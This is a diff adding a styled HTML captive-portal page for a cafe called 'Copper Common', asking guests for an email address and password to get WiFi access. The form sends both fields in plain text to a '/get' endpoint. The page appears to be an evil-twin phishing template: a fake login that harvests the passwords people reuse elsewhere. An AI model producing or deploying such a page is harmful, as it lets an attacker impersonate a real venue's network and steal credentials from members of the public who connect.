@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<title>Copper Common — WiFi</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:"Trebuchet MS",Tahoma,Geneva,Verdana,sans-serif;background:#2C1F14;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.card{width:100%;max-width:400px;background:#1a1208;border:1px solid #3a2510;border-radius:8px;overflow:hidden;box-shadow:0 16px 50px rgba(0,0,0,0.5)}
+.top{padding:28px 24px 20px;text-align:center;border-bottom:1px solid #3a2510}
+.brand{font-size:22px;font-weight:700;color:#C87941;letter-spacing:3px;text-transform:uppercase}
+.tagline{font-size:9px;color:#6a4a28;letter-spacing:2.5px;text-transform:uppercase;margin-top:6px}
+.mid{background:#111;border-bottom:1px solid #3a2510;padding:8px 24px;display:flex;align-items:center;gap:8px}
+.dot{width:6px;height:6px;background:#C87941;border-radius:50%;flex-shrink:0}
+.mid span{font-size:11px;color:#5a3a18}
+.mid strong{color:#C87941}
+.body{padding:24px}
+h2{font-size:16px;font-weight:700;color:#C87941;margin-bottom:3px}
+.sub{font-size:12px;color:#5a3a18;margin-bottom:4px}
+.lbl{display:block;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;color:#5a3a18;margin-bottom:6px;margin-top:18px}
+input{width:100%;padding:11px 14px;border:1px solid #3a2510;border-radius:6px;font-size:14px;background:#111;color:#C87941;font-family:inherit}
+input:focus{outline:none;border-color:#C87941}
+input::placeholder{color:#2a1a08}
+.btn{width:100%;padding:12px;margin-top:18px;border:1px solid #C87941;background:transparent;color:#C87941;font-size:12px;font-weight:700;letter-spacing:2px;text-transform:uppercase;cursor:pointer;font-family:inherit;transition:all .2s}
+.btn:hover{background:#C87941;color:#111}
+.terms{font-size:10.5px;color:#3a2510;text-align:center;margin-top:12px;line-height:1.6}
+.terms a{color:#C87941}
+.foot{background:#111;border-top:1px solid #3a2510;padding:11px 24px;display:flex;justify-content:space-between}
+.foot span,.foot a{font-size:10px;color:#3a2510;text-decoration:none}
+.foot a{color:#6a4a28}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="top">
+    <div class="brand">Copper Common</div>
+    <div class="tagline">Artisan Coffee &bull; Neighborhood Bar</div>
+  </div>
+  <div class="mid"><div class="dot"></div><span>Network: <strong>CopperCommon_WiFi</strong></span></div>
+  <div class="body">
+    <h2>Guest WiFi Access</h2>
+    <p class="sub">Sign in to access our complimentary network.</p>
+    <form action="/get">
+      <label class="lbl">Email Address</label>
+      <input name="email" type="text" placeholder="your@email.com" required>
+      <label class="lbl">Password</label>
+      <input name="password" type="password" placeholder="••••••••" required>
+      <button type="submit" class="btn">Connect</button>
+      <p class="terms">By connecting you agree to our <a href="#">Terms of Use</a>.</p>
+    </form>
+  </div>
+  <div class="foot"><span>&copy; Copper Common</span><a href="#">Help</a></div>
+</div>
+</body>
+</html>
